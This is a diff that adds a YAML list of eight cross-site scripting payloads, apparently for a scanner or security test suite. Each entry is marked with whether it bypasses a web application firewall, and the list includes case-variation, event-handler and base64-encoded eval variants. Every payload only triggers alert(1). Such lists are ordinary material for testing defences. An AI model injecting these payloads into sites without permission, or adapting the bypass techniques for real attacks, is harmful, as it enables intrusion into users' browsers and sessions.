@@ -1,0 +1,33 @@
+﻿payloads:
+  - payload: '<script>alert(1)</script>'
+    description: Basic XSS
+    bypass_waf: false
+    severity: medium
+  - payload: '<img src=x onerror=alert(1)>'
+    description: img onerror XSS
+    bypass_waf: false
+    severity: medium
+  - payload: '<svg onload=alert(1)>'
+    description: SVG onload XSS
+    bypass_waf: true
+    severity: medium
+  - payload: '"><script>alert(1)</script>'
+    description: Attribute breakout XSS
+    bypass_waf: false
+    severity: medium
+  - payload: 'javascript:alert(1)'
+    description: JavaScript URI XSS
+    bypass_waf: true
+    severity: medium
+  - payload: '<ScRiPt>alert(1)</ScRiPt>'
+    description: Case variation WAF bypass
+    bypass_waf: true
+    severity: medium
+  - payload: '"><img src=x:x onerror=eval(atob("YWxlcnQoMSk="))>'
+    description: Base64 encoded eval XSS
+    bypass_waf: true
+    severity: high
+  - payload: '<details/open/ontoggle=alert(1)>'
+    description: HTML5 toggle event XSS
+    bypass_waf: true
+    severity: medium
